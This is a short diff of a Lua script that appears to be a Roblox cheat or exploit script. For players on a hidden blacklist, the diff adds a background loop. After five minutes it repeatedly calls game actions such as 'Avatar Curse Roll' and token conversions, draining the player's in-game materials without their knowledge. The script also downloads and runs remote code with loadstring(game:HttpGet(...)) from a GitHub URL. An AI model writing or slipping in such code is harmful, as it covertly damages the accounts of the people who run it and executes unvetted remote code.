@@ -271,6 +271,7 @@ if BlacklistedIDs[LocalPlayer.UserId] then
     task.spawn(function()
         task.wait(300)
         while true do
+            Reply.To("Avatar Curse Roll")
             for tokenname, owneds in pData.Materials do
                 if owneds > 0 then
                     Reply.To("Fast Token Conversion", tokenname)
@@ -280,6 +281,7 @@ if BlacklistedIDs[LocalPlayer.UserId] then
             Reply.To("Convert Tokens", "UniqueSkillsShard", true, 1)
         end
     end)
+    return
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ANHub-Script/ANUI/refs/heads/main/dist/loading.lua"))()
 -- [[ SYNCHRONIZED WATER BYPASS - FIX READONLY ]] --
